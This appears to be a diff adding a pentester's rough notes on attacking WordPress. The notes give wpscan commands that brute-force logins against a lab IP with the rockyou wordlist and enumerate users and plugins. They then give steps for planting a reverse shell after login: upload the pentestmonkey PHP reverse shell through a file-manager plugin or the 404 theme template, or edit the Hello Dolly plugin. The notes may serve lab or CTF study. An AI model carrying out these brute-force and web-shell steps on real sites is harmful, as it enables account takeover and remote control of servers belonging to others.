@@ -1,0 +1,34 @@
+## wpscan
+Guide  https://www.hackingarticles.in/wpscanwordpress-pentesting-framework/ 
+
+https://www.wpwhitesecurity.com/strong-wordpress-passwords-wpscan/ 
+
+wpscan --url 192.168.1.101 --usernames (lists) --passwords (lists) --maxthreads 50 
+
+wpscan --url 192.168.1.101 --passwords /usr/share/wordlists/rockyou.txt --username john --max-threads 50 --disable-tls-check 
+
+wpscan --url 192.168.1.101 --passwords /usr/share/wordlists/rockyou.txt --username john --max-threads 50
+
+EVER stuck in something alway lookout for cheat sheet 
+
+wpscan --help 
+
+wpscan -u http://ip -e u vp --wordlists /usr/share/wordlist/rockyou.txt 
+
+--wordlist /usr/share/Web-shells/laudanuam-0.8/php/php-reverse-shell.php
+
+easiest way to get in or promt the shell 
+Once you're in wordpress acc 
+look for the plugins and apperance 
+
+in plugins (look for dolly) add new install filemanager and import the revere shell php (pentest monkey ) extract change the IP, ports upload in apperances in 404 not found then search for any random sites then boom! 
+
+In plugins-editor look for hello dolly 
+
+can also look in url <ip/wp-content/plugins/hello.php>
+							<ip/wp-content/uploads/> 
+
+In plugins > installed plugins > leenk.me (Active) check facebook > save 
+ 
+
+
